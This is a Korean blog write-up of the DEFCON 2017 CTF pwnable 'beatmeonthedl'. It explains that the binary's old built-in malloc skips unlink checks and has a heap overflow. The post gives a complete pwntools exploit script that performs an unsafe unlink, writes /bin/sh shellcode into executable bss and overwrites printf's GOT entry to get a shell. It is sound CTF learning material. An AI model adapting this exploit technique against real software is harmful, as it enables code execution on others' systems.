---
title: DEFCON 2017 - beatmeonthedl
categories:
 - pwnable
tags: defcon, pwn, shellcode, unlink
---

## Introduction

구 버전의 malloc이 binary안에 정적으로 박혀있어서 request를 할당할때 구버전의 malloc을 사용한다.(free도 마찬가지)

## Vunlnerability

```
I) Request Exploit.
II) Print Requests.
III) Delete Request.
IV) Change Request.
V) Go Away.
|
```

```
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x0040a000         r-xp      /workspace/z3-practice/Defcon/2017/beatmeonthedl/beatmeonthedl
0x00609000         0x0060a000         rwxp      /workspace/z3-practice/Defcon/2017/beatmeonthedl/beatmeonthedl
0x00007efefdcb0000 0x00007efefde6e000 r-xp      /lib/x86_64-linux-gnu/libc-2.19.so
0x00007efefde6e000 0x00007efefe06e000 ---p      /lib/x86_64-linux-gnu/libc-2.19.so
0x00007efefe06e000 0x00007efefe072000 r-xp      /lib/x86_64-linux-gnu/libc-2.19.so
0x00007efefe072000 0x00007efefe074000 rwxp      /lib/x86_64-linux-gnu/libc-2.19.so
0x00007efefe074000 0x00007efefe079000 rwxp      mapped
0x00007efefe079000 0x00007efefe09c000 r-xp      /lib/x86_64-linux-gnu/ld-2.19.so
0x00007efefe28c000 0x00007efefe28f000 rwxp      mapped
0x00007efefe29b000 0x00007efefe29c000 r-xp      /lib/x86_64-linux-gnu/ld-2.19.so
0x00007efefe29c000 0x00007efefe29d000 rwxp      /lib/x86_64-linux-gnu/ld-2.19.so
0x00007efefe29d000 0x00007efefe29e000 rwxp      mapped
0x00007ffc4dc29000 0x00007ffc4dc4a000 rwxp      [stack]
0x00007ffc4ddf5000 0x00007ffc4ddf7000 r--p      [vvar]
0x00007ffc4ddf7000 0x00007ffc4ddf9000 r-xp      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```

구 버전의 malloc이여서 unlink에 대한 검사를 하지 않는다.

## Exploit

heap overflow도 존재하여 fd, bk를 조작해서 unlink로 손쉽게 request list의 값을 조작할 수 있었다.

또한 bss영역에 실행권한도 있어서 ohce처럼 shellcode로 쉘을 땄다.

## slv.py

```python
from pwn import *

p = process('./beatmeonthedl')
e = ELF('./beatmeonthedl')

printf_got = e.got['printf']

shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

sla = lambda c, s : p.sendlineafter(c,str(s))
sa = lambda c, s : p.sendafter(c,str(s))


def request_exploit(r):
	
	sla('| ', '1')
	sa('> ', r)
	
	return

def print_requests():
	sla('| ', '2')
	
	return p.recvuntil('I')

def delete_request(i):
	sla('| ', '3')
	sla(': ', i)
	
	return

def change_request(i, r):
	sla('| ', '4')
	sla(': ', i)
	sa(': ', r)
	
	return



def main():

	# login
	
	sla(': ', 'mcfly')
	sla(': ', 'awesnap')
	
	# create chunk
	
	request_exploit(1)
	request_exploit(2)
	request_exploit(3)
	request_exploit(4)
	request_exploit(5)
	
	delete_request(3)
	delete_request(1)
	
	# trigger heap overflow
	
	payload = ''
	payload += 'a'* 0x30
	payload += p64(0x40) + p64(0x41)
	payload += p64(0x609e70) + p64(0x609e70)
	
	change_request(0, payload)
	change_request(2, payload)
	
	# trigger unsafe unlink
	
	request_exploit(p64(0))
	
	# allocate request_list
	
	payload = ''
	payload += p64(0x609e80) * 0x3
	payload += p64(0x609000)
	payload += p64(printf_got)
	payload += p64(0x0) * 0x5
	
	request_exploit(payload)
	
	# write shellcode at bss
	
	payload = ''
	payload += shellcode
	change_request(3, payload)
	
	# overwrite printf_got to bss_addr
	
	payload = ''
	payload += p64(0x00609000)
	change_request(4, payload)
	
	p.interactive()
	
	return

if __name__ == '__main__':
	main()
```

## 느낀 점

- 나도 실력이 그래도 처음 시작할때 보단 늘었다는 걸 느꼈다. 정말 쉽다.


:smile::smile::smile:
